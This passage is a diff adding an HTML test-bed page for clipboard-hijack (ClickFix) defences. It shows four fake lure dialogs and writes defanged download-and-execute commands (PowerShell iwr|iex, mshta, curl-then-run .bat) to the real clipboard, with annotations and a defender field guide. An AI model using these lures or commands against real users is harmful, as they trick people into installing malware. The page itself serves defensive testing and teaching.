@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex, nofollow">
+<meta name="description" content="A live clipboard-hijack test bed for ClickFix-style social engineering, built to demonstrate clipboard-protection tooling in Chromium.">
+<title>ClickFix Test Bed</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%9B%A1%EF%B8%8F%3C/text%3E%3C/svg%3E">
+<style>
+  :root{
+    --bg:#f4f6f8; --panel:#ffffff; --panel-2:#eef1f4; --line:#d8dee4;
+    --text:#12161c; --text-dim:#55626c; --text-faint:#8b98a3;
+    --accent:#c85a10; --accent-soft:#f4dcc7;
+    --safe:#127a5f; --safe-soft:#d6f0e6;
+    --danger:#b0212f; --danger-soft:#fbdde0;
+    --warn:#9a6b00; --warn-soft:#f6e6bf;
+    --os-bg:#f3f3f3; --os-chrome:#e2e2e2; --os-text:#1b1b1b; --os-line:#c9c9c9;
+    --radius:10px;
+    --shadow:0 1px 2px rgba(20,24,28,.06), 0 8px 24px -12px rgba(20,24,28,.18);
+  }
+  @media (prefers-color-scheme: dark){
+    :root{
+      --bg:#10141a; --panel:#171d24; --panel-2:#1c232c; --line:#2a323c;
+      --text:#e7ebee; --text-dim:#9aa7b2; --text-faint:#6b7883;
+      --accent:#ff8a44; --accent-soft:#3a2415;
+      --safe:#4fd1ae; --safe-soft:#123028;
+      --danger:#ff6b76; --danger-soft:#3a1518;
+      --warn:#e6b84d; --warn-soft:#3a2f0f;
+      --os-bg:#f3f3f3; --os-chrome:#e2e2e2; --os-text:#1b1b1b; --os-line:#c9c9c9;
+      --shadow:0 1px 2px rgba(0,0,0,.3), 0 12px 32px -12px rgba(0,0,0,.55);
+    }
+  }
+  *{box-sizing:border-box;}
+  body{
+    margin:0; background:var(--bg); color:var(--text);
+    font-family:-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    line-height:1.5; -webkit-font-smoothing:antialiased;
+  }
+  code,.mono{ font-family:"SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace; }
+  h1,h2,h3{ text-wrap:balance; margin:0; font-weight:700; }
+  p{ margin:0; }
+  ::selection{ background:var(--accent-soft); }
+  :focus-visible{ outline:2px solid var(--accent); outline-offset:2px; border-radius:4px; }
+  button{ font-family:inherit; cursor:pointer; }
+  .container{ max-width:1080px; margin:0 auto; padding:0 24px; }
+
+  .banner{
+    position:sticky; top:0; z-index:50; background:var(--warn-soft); color:var(--warn);
+    border-bottom:1px solid var(--line); font-family:var(--mono,monospace); font-size:12.5px;
+  }
+  .banner .container{ display:flex; align-items:center; gap:10px; padding:10px 24px; flex-wrap:wrap; }
+  .banner strong{ font-weight:700; }
+  .banner-dot{ width:7px; height:7px; border-radius:50%; background:var(--warn); flex:none;
+    box-shadow:0 0 0 3px color-mix(in srgb, var(--warn) 25%, transparent); }
+
+  .hero{ padding:64px 0 48px; border-bottom:1px solid var(--line); }
+  .eyebrow{
+    display:inline-flex; align-items:center; gap:8px; font-family:"SFMono-Regular",Consolas,monospace;
+    font-size:12px; letter-spacing:.09em; text-transform:uppercase; color:var(--accent); font-weight:600;
+    padding:5px 10px; border:1px solid color-mix(in srgb, var(--accent) 35%, var(--line));
+    border-radius:100px; background:var(--accent-soft);
+  }
+  .hero h1{ font-size:clamp(32px,5vw,48px); line-height:1.05; margin-top:18px; letter-spacing:-.02em; }
+  .hero .lede{ margin-top:16px; max-width:66ch; font-size:16.5px; color:var(--text-dim); }
+  .hero .lede b{ color:var(--text); font-weight:600; }
+  .hero .facts{ margin-top:22px; display:flex; gap:22px; flex-wrap:wrap; font-size:13px; color:var(--text-dim); }
+  .hero .facts li{ list-style:none; display:flex; align-items:center; gap:7px; }
+  .hero .facts b{ color:var(--text); }
+
+  section{ padding:52px 0; }
+  .section-head{ max-width:62ch; }
+  .section-head .tag{ font-family:"SFMono-Regular",Consolas,monospace; font-size:12px; letter-spacing:.08em;
+    text-transform:uppercase; color:var(--text-faint); }
+  .section-head h2{ font-size:26px; margin-top:8px; }
+  .section-head p{ margin-top:10px; color:var(--text-dim); font-size:15px; }
+
+  .tabs{ display:flex; gap:8px; margin-top:26px; flex-wrap:wrap; }
+  .tab{
+    display:flex; align-items:center; gap:9px; padding:10px 16px; border-radius:100px;
+    border:1px solid var(--line); background:var(--panel); color:var(--text-dim);
+    font-size:13.5px; font-weight:500; transition:border-color .15s,color .15s,background .15s;
+  }
+  .tab[aria-selected="true"]{ border-color:var(--accent); color:var(--text); background:var(--accent-soft); }
+  .tab:hover{ color:var(--text); }
+
+  .stage{ margin-top:24px; }
+  .stage-grid{ display:grid; grid-template-columns:1.05fr .95fr; gap:22px; align-items:start; }
+  @media (max-width:860px){ .stage-grid{ grid-template-columns:1fr; } }
+  .panel{ background:var(--panel); border:1px solid var(--line); border-radius:var(--radius); box-shadow:var(--shadow); }
+  .panel-label{ font-family:"SFMono-Regular",Consolas,monospace; font-size:11.5px; letter-spacing:.07em;
+    text-transform:uppercase; color:var(--text-faint); margin-bottom:10px; }
+
+  .os-window{ border-radius:8px; overflow:hidden; border:1px solid var(--os-line); background:var(--os-bg);
+    box-shadow:var(--shadow); position:relative; }
+  .os-window .titlebar{ display:flex; align-items:center; gap:8px; padding:8px 10px; background:var(--os-chrome);
+    border-bottom:1px solid var(--os-line); font-size:12.5px; color:var(--os-text); font-weight:500; }
+  .os-window .titlebar .app-ico{ width:15px;height:15px;border-radius:3px;flex:none;
+    background:linear-gradient(135deg,#3a7bd5,#2ecfa1); }
+  .os-window .titlebar .win-dots{ margin-left:auto; display:flex; gap:6px; }
+  .os-window .titlebar .win-dots span{ width:11px; height:11px; border-radius:2px; background:#d8d8d8; display:inline-block; }
+  .demo-ribbon{ position:absolute; top:9px; right:-30px; transform:rotate(38deg); background:var(--warn); color:#241a00;
+    font-family:"SFMono-Regular",Consolas,monospace; font-size:9.5px; font-weight:700; letter-spacing:.08em;
+    padding:2px 34px; z-index:5; box-shadow:0 2px 6px rgba(0,0,0,.25); }
+  .os-body{ padding:26px 24px 24px; color:var(--os-text); }
+  .os-body.center{ text-align:center; padding:34px 28px; }
+  .status-box{ display:inline-flex; align-items:center; gap:14px; border:1px solid #d3d3d3; border-radius:6px;
+    padding:16px 22px; background:#fafafa; margin:18px auto 6px; }
+  .spinner{ width:22px; height:22px; border-radius:50%; border:3px solid #d7d7d7; border-top-color:#4a90d9;
+    animation:spin 1s linear infinite; }
+  @media (prefers-reduced-motion:reduce){ .spinner{ animation:none; } }
+  @keyframes spin{ to{ transform:rotate(360deg); } }
+  .os-body h4{ font-size:15px; margin:0 0 4px; color:var(--os-text); }
+  .os-body .sub{ font-size:12.5px; color:#6b6b6b; }
+  .lure-icon{ width:40px; height:40px; border-radius:9px; display:flex; align-items:center; justify-content:center;
+    font-size:20px; margin:0 auto 14px; background:#fdece6; color:#c85a10; }
+  .steps-list{ text-align:left; margin:18px auto 0; max-width:340px; font-size:13px; color:#33393f;
+    background:#fff; border:1px solid #e2e2e2; border-radius:6px; padding:14px 16px; }
+  .steps-list li{ margin:0 0 6px; } .steps-list li:last-child{ margin-bottom:0; }
+  .steps-list b{ font-family:"SFMono-Regular",Consolas,monospace; background:#f0f0f0; padding:1px 5px; border-radius:3px; }
+
+  .copy-btn{ margin-top:20px; display:inline-flex; align-items:center; gap:8px; background:#1b1b1b; color:#fff;
+    border:none; border-radius:6px; padding:11px 20px; font-size:13.5px; font-weight:600; }
+  .copy-btn:hover{ background:#333; }
+  .copy-btn:disabled{ opacity:.55; cursor:wait; }
+  .copy-btn.blocked{ background:var(--danger); }
+  .copy-btn.written{ background:var(--warn); color:#241a00; }
+
+  .log{ margin-top:16px; max-width:380px; text-align:left; display:flex; flex-direction:column; gap:6px; }
+  .log-row{ display:flex; gap:8px; align-items:flex-start; font-size:11.5px; font-family:"SFMono-Regular",Consolas,monospace;
+    background:#fff; border:1px solid #e2e2e2; border-radius:5px; padding:7px 9px; color:#333; }
+  .log-row .t{ color:#9a9a9a; flex:none; }
+  .log-row.ok{ border-color:var(--danger); color:var(--danger); background:var(--danger-soft); }
+  .log-row.blocked{ border-color:var(--safe); color:var(--safe); background:var(--safe-soft); }
+  .log-row.warn{ border-color:var(--warn); color:#7a5a00; background:var(--warn-soft); }
+  .recheck-btn{ align-self:flex-start; margin-top:2px; font-size:11.5px; padding:5px 11px; border-radius:5px;
+    border:1px solid #c6c6c6; background:#f2f2f2; color:#222; }
+
+  .run-dialog{ max-width:420px; }
+  .run-dialog .titlebar{ background:#f6f6f6; }
+  .run-body{ padding:20px; background:#fff; }
+  .run-body .prompt{ font-size:12.5px; color:#333; margin-bottom:12px; }
+  .run-field{ display:flex; align-items:center; gap:10px; border:1px solid #b7b7b7; border-radius:4px;
+    padding:8px 10px; background:#fff; }
+  .run-field input{ flex:1; border:none; outline:none; font-family:"SFMono-Regular",Consolas,monospace;
+    font-size:12.5px; color:#111; background:transparent; min-width:0; }
+  .run-field input::placeholder{ color:#a6a6a6; font-family:-apple-system,sans-serif; }
+  .run-field button{ flex:none; font-size:11.5px; padding:4px 10px; border-radius:4px; border:1px solid #c6c6c6;
+    background:#f2f2f2; }
+  .run-actions{ display:flex; justify-content:flex-end; gap:8px; margin-top:16px; }
+  .run-actions button{ padding:7px 16px; font-size:12.5px; border-radius:4px; border:1px solid #c6c6c6;
+    background:#f2f2f2; color:#222; }
+  .run-actions button.primary{ background:#0a63c9; border-color:#0a63c9; color:#fff; font-weight:500; }
+  .run-actions button:disabled{ opacity:.45; cursor:not-allowed; }
+  .paste-hint{ display:flex; align-items:center; gap:8px; margin-top:14px; font-size:12px; color:var(--accent);
+    font-family:"SFMono-Regular",Consolas,monospace; }
+
+  .breakdown{ padding:20px 22px 22px; }
+  .breakdown .headline{ display:flex; align-items:center; gap:10px; font-weight:700; font-size:14.5px; }
+  .breakdown .headline.danger{ color:var(--danger); }
+  .breakdown .headline.safe{ color:var(--safe); }
+  .breakdown .headline .badge{ width:22px;height:22px;border-radius:50%; color:#fff; display:flex;
+    align-items:center; justify-content:center; font-size:13px; flex:none; }
+  .breakdown .headline.danger .badge{ background:var(--danger); }
+  .breakdown .headline.safe .badge{ background:var(--safe); }
+  .cmd-annotated{ margin-top:16px; background:var(--panel-2); border:1px solid var(--line); border-radius:7px;
+    padding:14px 16px; font-family:"SFMono-Regular",Consolas,monospace; font-size:12.5px; line-height:1.9;
+    overflow-x:auto; white-space:pre; }
+  .cmd-annotated .tok{ border-radius:3px; padding:1px 3px; }
+  .cmd-annotated .tok.flag{ background:var(--danger-soft); color:var(--danger); }
+  .flag-list{ list-style:none; margin:16px 0 0; padding:0; display:flex; flex-direction:column; gap:10px; }
+  .flag-list li{ display:flex; gap:10px; font-size:13px; color:var(--text-dim); align-items:flex-start; }
+  .flag-list .chip{ font-family:"SFMono-Regular",Consolas,monospace; font-size:10.5px; font-weight:700; color:var(--danger);
+    background:var(--danger-soft); border-radius:4px; padding:2px 6px; flex:none; margin-top:1px; }
+  .flag-list b{ color:var(--text); font-weight:600; }
+  .note{ margin-top:18px; display:flex; gap:10px; align-items:flex-start; font-size:12.5px; border-radius:7px;
+    padding:12px 14px; }
+  .note.safe{ color:var(--safe); background:var(--safe-soft); }
+  .note.warn{ color:var(--warn); background:var(--warn-soft); }
+
+  .modes-grid{ display:grid; grid-template-columns:1fr 1fr; gap:20px; margin-top:28px; }
+  @media (max-width:720px){ .modes-grid{ grid-template-columns:1fr; } }
+  .mode-card{ padding:22px 22px 24px; }
+  .mode-card .mh{ display:flex; align-items:center; gap:9px; }
+  .mode-card .dot{ width:9px;height:9px;border-radius:50%; }
+  .mode-card.m1 .dot{ background:var(--accent); } .mode-card.m2 .dot{ background:var(--safe); }
+  .mode-card h3{ font-size:15.5px; }
+  .mode-card p{ margin-top:10px; font-size:13.5px; color:var(--text-dim); }
+  .mode-card ul{ list-style:none; margin:14px 0 0; padding:0; display:flex; flex-direction:column; gap:10px; }
+  .mode-card li{ font-size:13px; color:var(--text-dim); display:flex; gap:9px; }
+  .mode-card li::before{ content:"—"; color:var(--text-faint); flex:none; }
+  .mode-card li b{ color:var(--text); font-weight:600; }
+
+  .guide-grid{ display:grid; grid-template-columns:1fr 1fr; gap:20px; margin-top:28px; }
+  @media (max-width:720px){ .guide-grid{ grid-template-columns:1fr; } }
+  .guide-card{ padding:22px 22px 24px; }
+  .guide-card .gh{ display:flex; align-items:center; gap:9px; }
+  .guide-card .gh .dot{ width:9px;height:9px;border-radius:50%; }
+  .guide-card.red .gh .dot{ background:var(--danger); } .guide-card.green .gh .dot{ background:var(--safe); }
+  .guide-card h3{ font-size:15.5px; }
+  .guide-card ul{ list-style:none; margin:16px 0 0; padding:0; display:flex; flex-direction:column; gap:12px; }
+  .guide-card li{ font-size:13.5px; color:var(--text-dim); display:flex; gap:10px; }
+  .guide-card li::before{ content:"—"; color:var(--text-faint); flex:none; }
+  .guide-card li b{ color:var(--text); font-weight:600; }
+
+  footer{ border-top:1px solid var(--line); padding:32px 0 48px; }
+  footer .container{ display:flex; justify-content:space-between; gap:16px; flex-wrap:wrap; }
+  footer p{ font-size:12.5px; color:var(--text-faint); max-width:60ch; }
+  footer .brand{ font-family:"SFMono-Regular",Consolas,monospace; font-size:12.5px; color:var(--text-dim); }
+</style>
+</head>
+<body>
+
+<div class="banner">
+  <div class="container">
+    <span class="banner-dot" aria-hidden="true"></span>
+    <span><strong>LIVE CLIPBOARD TEST</strong> — clicking "Copy fix command" performs a real
+    <code>navigator.clipboard</code> write, the same mechanism ClickFix payloads use, so clipboard-protection
+    tooling has something real to intercept. No command on this page is ever executed automatically —
+    only a human manually pasting into a real Run/terminal window could do that, and this page cannot
+    trigger that step for you.</span>
+  </div>
+</div>
+
+<header class="hero">
+  <div class="container">
+    <span class="eyebrow">Clipboard-hijack test bed</span>
+    <h1>ClickFix Test Bed</h1>
+    <p class="lede">
+      ClickFix is a social-engineering technique that convinces a visitor to fix a fake problem
+      themselves &mdash; by opening the Windows Run dialog and pasting a command copied from a page.
+      <b>The "fix" is the infection.</b> This page reproduces four common lure patterns and performs a
+      <b>real</b> clipboard write for each one, so you can point clipboard-protection tooling at it and
+      watch the interception happen live.
+    </p>
+    <ul class="facts">
+      <li>🔒 <span><b>HTTPS-only</b> Clipboard API requires a secure context</span></li>
+      <li>🧭 <span><b>No external requests</b> — everything runs client-side</span></li>
+      <li>🧪 <span><b>Payload text is defanged</b> — non-functional even if actually run</span></li>
+    </ul>
+  </div>
+</header>
+
+<section id="scenarios">
+  <div class="container">
+    <div class="section-head">
+      <div class="tag">Try it live</div>
+      <h2>Four lures, one mechanism</h2>
+      <p>Pick a scenario. Click "Copy fix command" exactly as a target would — it really does write to
+      your clipboard. Use "Check clipboard now" to poll what's actually sitting there, so you can watch a
+      quarantine-and-scan flow resolve in real time.</p>
+    </div>
+
+    <div class="tabs" role="tablist" aria-label="ClickFix scenarios">
+      <button class="tab" role="tab" aria-selected="true" data-scenario="verify">🛡️ Identity verification</button>
+      <button class="tab" role="tab" aria-selected="false" data-scenario="meet">🎥 Video call error</button>
+      <button class="tab" role="tab" aria-selected="false" data-scenario="update">🌐 Browser update failed</button>
+      <button class="tab" role="tab" aria-selected="false" data-scenario="alert">⚠️ Threat detected</button>
+    </div>
+
+    <div class="stage">
+      <div class="stage-grid">
+        <div>
+          <div class="panel-label">The lure, as a target would see it</div>
+          <div class="os-window" id="lureWindow">
+            <span class="demo-ribbon">DEMO</span>
+            <div class="titlebar">
+              <span class="app-ico" aria-hidden="true"></span>
+              <span id="lureTitle"></span>
+              <span class="win-dots" aria-hidden="true"><span></span><span></span><span></span></span>
+            </div>
+            <div class="os-body" id="lureBody"></div>
+          </div>
+        </div>
+
+        <div>
+          <div class="panel-label">What happens when you paste it</div>
+          <div class="os-window run-dialog">
+            <div class="titlebar"><span class="app-ico" aria-hidden="true"></span><span>Run</span></div>
+            <div class="run-body">
+              <p class="prompt">Type the name of a program, folder, document, or internet resource, and
+                Windows will open it for you.</p>
+              <div class="run-field">
+                <input type="text" id="runInput" placeholder="Open:" readonly>
+                <button id="pasteBtn">Paste</button>
+              </div>
+              <p class="paste-hint" id="pasteHint">↳ copy the fix command on the lure, then paste it here</p>
+              <div class="run-actions">
+                <button id="runOk" class="primary" disabled>OK</button>
+                <button id="runCancel">Cancel</button>
+              </div>
+            </div>
+          </div>
+          <div class="panel" id="breakdownPanel" style="margin-top:16px; display:none;"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="modes" style="border-top:1px solid var(--line); background:var(--panel-2);">
+  <div class="container">
+    <div class="section-head">
+      <div class="tag">Demoing your extension</div>
+      <h2>Compare both protection modes</h2>
+      <p>This page's job is always the same: attempt a real clipboard write. What happens to that write
+      depends entirely on how the extension is configured — switch modes in its options and re-run the
+      "Copy fix command" step above to show the difference live.</p>
+    </div>
+    <div class="modes-grid">
+      <div class="panel mode-card m1">
+        <div class="mh"><span class="dot"></span><h3>Clipboard API Only</h3></div>
+        <p>Blocks every programmatic clipboard write, unconditionally — content is never inspected.</p>
+        <ul>
+          <li><b>Expected result here:</b> the write attempt above fails or is silently dropped every time, regardless of scenario.</li>
+          <li><b>Blind spot to call out:</b> a lure that asks the target to manually select and copy text (no script involved) still gets through in this mode.</li>
+        </ul>
+      </div>
+      <div class="panel mode-card m2">
+        <div class="mh"><span class="dot"></span><h3>AI Classifier</h3></div>
+        <p>Lets the write land, immediately quarantines the clipboard behind a placeholder, screens the text
+        with local heuristics and a cloud classifier, then restores it if benign.</p>
+        <ul>
+          <li><b>Expected result here:</b> click "Check clipboard now" right after copying and again a moment later — you should see the placeholder, then a final verdict, since every payload on this page is written to mirror a real ClickFix command.</li>
+          <li><b>What it catches that Mode 1 misses:</b> nothing extra for scripted copies — this mode is about deciding intent, not just blocking the mechanism.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="guide">
+  <div class="container">
+    <div class="section-head">
+      <div class="tag">Field guide</div>
+      <h2>Spot it. Stop it.</h2>
+      <p>Worth keeping regardless of which scenario or protection mode you're demoing.</p>
+    </div>
+    <div class="guide-grid">
+      <div class="panel guide-card red">
+        <div class="gh"><span class="dot"></span><h3>Red flags in the lure</h3></div>
+        <ul>
+          <li><b>It asks you to open Run, PowerShell, or Terminal.</b> No legitimate verification, video call, or browser update ever needs that.</li>
+          <li><b>It gives you keyboard steps, not a button.</b> "Press Win+R, then Ctrl+V, then Enter" is the whole attack, spelled out as instructions.</li>
+          <li><b>The fix is oddly specific and urgent.</b> Framing creates just enough pressure to skip the "wait, why?" moment.</li>
+          <li><b>You can't verify what's actually on your clipboard</b> until you've already pasted it somewhere.</li>
+        </ul>
+      </div>
+      <div class="panel guide-card green">
+        <div class="gh"><span class="dot"></span><h3>What to do instead</h3></div>
+        <ul>
+          <li><b>Never paste into Run, PowerShell, or a terminal because a webpage told you to.</b> That single habit defeats this entire attack class.</li>
+          <li><b>Close the tab.</b> A real verification or update failure survives you leaving and coming back.</li>
+          <li><b>Go to the real service directly</b> by typing the known URL yourself.</li>
+          <li><b>If you already pasted and ran something,</b> disconnect from the network and report it immediately.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="container">
+    <span class="brand">ClickFix Test Bed</span>
+    <p>Built to validate clipboard-hijack defenses. Every domain shown is defanged (<code>hxxps://</code>,
+    <code>[.]invalid</code>) and non-resolvable, so a copied payload does nothing even if it were pasted
+    and run for real. The page makes no network requests and loads no external resources.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var scenarios = {
+    verify: {
+      title: "identity-check.example",
+      lureHTML:
+        '<div class="os-body center">'+
+          '<div class="lure-icon">🛡️</div>'+
+          '<h4>Additional Verification Required</h4>'+
+          '<p class="sub">Please complete the check below to confirm you are not a bot.</p>'+
+          '<div class="status-box"><span class="spinner" aria-hidden="true"></span><span style="font-size:13px;color:#444;">Verifying browser&hellip;</span></div>'+
+          '<ol class="steps-list">'+
+            '<li>1. Press <b>Windows key + R</b></li>'+
+            '<li>2. Press <b>Ctrl + V</b></li>'+
+            '<li>3. Press <b>Enter</b></li>'+
+          '</ol>'+
+          '<button class="copy-btn" data-copy="verify">📋 Copy fix command (real clipboard write)</button>'+
+          '<div class="log" id="logHost"></div>'+
+        '</div>',
+      command: 'powershell -w hidden -c "iwr -useb hxxps://cf-verify-node[.]invalid/chk.ps1 | iex"',
+      tokens: [
+        {t:'powershell ', flag:false},
+        {t:'-w hidden', flag:true, note:'Launches PowerShell with its window hidden, so nothing visibly opens.'},
+        {t:' -c "iwr -useb ', flag:false},
+        {t:'hxxps://cf-verify-node[.]invalid/chk.ps1', flag:true, note:'A lookalike domain (defanged here) hosting the real payload script, not the actual verification service.'},
+        {t:' | iex', flag:true, note:'A "download cradle": fetch the script and execute it immediately in memory, nothing saved to disk to inspect.'},
+        {t:'"', flag:false}
+      ]
+    },
+    meet: {
+      title: "video-call.example",
+      lureHTML:
+        '<div class="os-body">'+
+          '<div class="lure-icon" style="margin:0 0 14px;">🎥</div>'+
+          '<h4>We can&rsquo;t connect to your microphone</h4>'+
+          '<p class="sub">Your camera driver may be out of date. Run the fix below to rejoin the call.</p>'+
+          '<ol class="steps-list">'+
+            '<li>1. Press <b>Windows key + R</b> to open Run</li>'+
+            '<li>2. Paste the fix with <b>Ctrl + V</b></li>'+
+            '<li>3. Press <b>Enter</b> to reconnect</li>'+
+          '</ol>'+
+          '<button class="copy-btn" data-copy="meet">📋 Copy fix command (real clipboard write)</button>'+
+          '<div class="log" id="logHost"></div>'+
+        '</div>',
+      command: 'mshta hxxps://meet-fix-cdn[.]invalid/driver.hta',
+      tokens: [
+        {t:'mshta ', flag:true, note:'A built-in Windows tool meant for .hta help files, abused here to run remote script content while looking like a normal system process.'},
+        {t:'hxxps://meet-fix-cdn[.]invalid/driver.hta', flag:true, note:'A fake "driver fixer" file. There is no camera or microphone driver at the other end, just a script.'}
+      ]
+    },
+    update: {
+      title: "browser-update.example",
+      lureHTML:
+        '<div class="os-body">'+
+          '<div class="lure-icon" style="margin:0 0 14px;">🌐</div>'+
+          '<h4>Update failed to install</h4>'+
+          '<p class="sub">Your browser couldn&rsquo;t finish updating automatically. Apply the patch manually to keep browsing.</p>'+
+          '<ol class="steps-list">'+
+            '<li>1. Open Run with <b>Windows key + R</b></li>'+
+            '<li>2. Paste the patch command</li>'+
+            '<li>3. Press <b>Enter</b> to install</li>'+
+          '</ol>'+
+          '<button class="copy-btn" data-copy="update">📋 Copy fix command (real clipboard write)</button>'+
+          '<div class="log" id="logHost"></div>'+
+        '</div>',
+      command: 'cmd /c curl -s hxxps://edge-update-cache[.]invalid/patch.bat -o %temp%\\p.bat && %temp%\\p.bat',
+      tokens: [
+        {t:'cmd /c curl -s ', flag:false},
+        {t:'hxxps://edge-update-cache[.]invalid/patch.bat', flag:true, note:'Not a real browser vendor domain, a server the attacker controls, hosting the real payload.'},
+        {t:' -o %temp%\\p.bat', flag:true, note:'Silently saves the file into a temp folder most users never look in.'},
+        {t:' && ', flag:false},
+        {t:'%temp%\\p.bat', flag:true, note:'Immediately runs the file it just downloaded, download and execution happen in one line.'}
+      ]
+    },
+    alert: {
+      title: "system-check.example",
+      lureHTML:
+        '<div class="os-body">'+
+          '<div class="lure-icon" style="margin:0 0 14px;background:#fbdde0;color:#b0212f;">⚠️</div>'+
+          '<h4>Threat detected on this device</h4>'+
+          '<p class="sub">We found 1 issue that could put your files at risk. Run the automatic removal tool now.</p>'+
+          '<ol class="steps-list">'+
+            '<li>1. Press <b>Windows key + R</b></li>'+
+            '<li>2. Paste the removal command</li>'+
+            '<li>3. Press <b>Enter</b> to clean your device</li>'+
+          '</ol>'+
+          '<button class="copy-btn" data-copy="alert">📋 Copy fix command (real clipboard write)</button>'+
+          '<div class="log" id="logHost"></div>'+
+        '</div>',
+      command: 'cmd /c curl -s hxxps://sys-clean-tools[.]invalid/remove.bat -o %temp%\\rm.bat && %temp%\\rm.bat',
+      tokens: [
+        {t:'cmd /c curl -s ', flag:false},
+        {t:'hxxps://sys-clean-tools[.]invalid/remove.bat', flag:true, note:'A fear-based lure with no real antivirus behind it, just a fake "cleaner" domain the attacker controls.'},
+        {t:' -o %temp%\\rm.bat', flag:true, note:'Drops the payload into a temp folder rather than anywhere a user would think to check.'},
+        {t:' && ', flag:false},
+        {t:'%temp%\\rm.bat', flag:true, note:'Runs the "removal tool" immediately, download and execution chained in one command.'}
+      ]
+    }
+  };
+
+  var lureWindow = document.getElementById('lureWindow');
+  var lureTitle = document.getElementById('lureTitle');
+  var lureBody = document.getElementById('lureBody');
+  var runInput = document.getElementById('runInput');
+  var runOk = document.getElementById('runOk');
+  var runCancel = document.getElementById('runCancel');
+  var pasteBtn = document.getElementById('pasteBtn');
+  var pasteHint = document.getElementById('pasteHint');
+  var breakdownPanel = document.getElementById('breakdownPanel');
+  var tabs = Array.prototype.slice.call(document.querySelectorAll('.tab'));
+  var current = 'verify';
+
+  function escapeHtml(str){
+    return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+
+  function timeNow(){
+    var d = new Date();
+    function p(n){ return (n<10?'0':'')+n; }
+    return p(d.getHours())+':'+p(d.getMinutes())+':'+p(d.getSeconds());
+  }
+
+  function addLogRow(cls, text){
+    var host = document.getElementById('logHost');
+    if (!host) return;
+    var row = document.createElement('div');
+    row.className = 'log-row ' + cls;
+    row.innerHTML = '<span class="t">'+timeNow()+'</span><span>'+escapeHtml(text)+'</span>';
+    host.appendChild(row);
+  }
+
+  async function attemptClipboardWrite(text){
+    try{
+      await navigator.clipboard.writeText(text);
+      return { ok:true, method:'Clipboard API' };
+    }catch(err){
+      try{
+        var ta = document.createElement('textarea');
+        ta.value = text;
+        ta.style.position = 'fixed';
+        ta.style.opacity = '0';
+        document.body.appendChild(ta);
+        ta.focus(); ta.select();
+        var ok = document.execCommand('copy');
+        document.body.removeChild(ta);
+        return { ok: ok, method:'execCommand fallback' };
+      }catch(err2){
+        return { ok:false, method:'none', error:err2 };
+      }
+    }
+  }
+
+  async function readClipboardSafe(){
+    try{
+      var text = await navigator.clipboard.readText();
+      return { readable:true, text:text };
+    }catch(err){
+      return { readable:false };
+    }
+  }
+
+  function render(key){
+    current = key;
+    var s = scenarios[key];
+    lureTitle.textContent = s.title;
+    lureBody.innerHTML = s.lureHTML;
+    runInput.value = '';
+    runOk.disabled = true;
+    pasteHint.textContent = '↳ copy the fix command on the lure, then paste it here';
+    pasteHint.style.color = 'var(--accent)';
+    breakdownPanel.style.display = 'none';
+    breakdownPanel.innerHTML = '';
+
+    tabs.forEach(function(t){
+      t.setAttribute('aria-selected', t.getAttribute('data-scenario') === key ? 'true' : 'false');
+    });
+
+    var copyBtn = lureBody.querySelector('[data-copy]');
+    if (copyBtn){
+      copyBtn.addEventListener('click', async function(){
+        copyBtn.disabled = true;
+        var original = copyBtn.textContent;
+        copyBtn.textContent = 'Writing to clipboard…';
+        var result = await attemptClipboardWrite(s.command);
+        copyBtn.disabled = false;
+
+        if (!result.ok){
+          copyBtn.textContent = '⛔ Write blocked';
+          copyBtn.classList.add('blocked');
+          addLogRow('blocked', 'Write via '+result.method+' — BLOCKED before it reached the clipboard');
+          pasteHint.textContent = '↳ the write was blocked — nothing to paste';
+          pasteHint.style.color = 'var(--safe)';
+        } else {
+          copyBtn.textContent = '⚠️ Written (verifying…)';
+          copyBtn.classList.add('written');
+          addLogRow('warn', 'Write via '+result.method+' — call succeeded, checking what actually landed…');
+          await new Promise(function(r){ setTimeout(r, 300); });
+          var check = await readClipboardSafe();
+          if (!check.readable){
+            addLogRow('warn', 'Cannot read clipboard back (permission not granted) — write status unconfirmed');
+          } else if (check.text === s.command){
+            addLogRow('ok', 'Clipboard contains the raw payload — not intercepted');
+          } else {
+            addLogRow('blocked', 'Clipboard now differs from the payload (currently: "'+(check.text||'').slice(0,40)+'") — looks quarantined/altered');
+          }
+          pasteHint.textContent = '↳ now click the Run field, then "Paste"';
+          pasteHint.style.color = 'var(--safe)';
+
+          var host = document.getElementById('logHost');
+          if (host && !document.getElementById('recheckBtn')){
+            var recheck = document.createElement('button');
+            recheck.id = 'recheckBtn';
+            recheck.className = 'recheck-btn';
+            recheck.textContent = '🔍 Check clipboard now';
+            recheck.addEventListener('click', async function(){
+              var c = await readClipboardSafe();
+              if (!c.readable){
+                addLogRow('warn', 'Clipboard read denied — cannot verify right now');
+              } else if (c.text === s.command){
+                addLogRow('ok', 'Still the raw payload — not intercepted');
+              } else if (!c.text){
+                addLogRow('blocked', 'Clipboard is empty — looks quarantined');
+              } else {
+                addLogRow('blocked', 'Clipboard differs from payload (currently: "'+c.text.slice(0,40)+'")');
+              }
+            });
+            host.appendChild(recheck);
+          }
+        }
+      });
+    }
+  }
+
+  pasteBtn.addEventListener('click', async function(){
+    var check = await readClipboardSafe();
+    if (check.readable && check.text){
+      runInput.value = check.text;
+      runOk.disabled = false;
+      pasteHint.textContent = '↳ pasted the real clipboard contents. Click "OK" to run it, like the target would.';
+    } else if (check.readable && !check.text){
+      runInput.value = '';
+      runOk.disabled = true;
+      pasteHint.textContent = '↳ clipboard is empty right now — nothing to paste';
+      pasteHint.style.color = 'var(--safe)';
+    } else {
+      pasteHint.textContent = '↳ clipboard read was denied by the browser — grant permission and try again';
+      pasteHint.style.color = 'var(--warn)';
+    }
+  });
+
+  function runIt(){
+    var s = scenarios[current];
+    var pasted = runInput.value;
+    var isPayload = pasted === s.command;
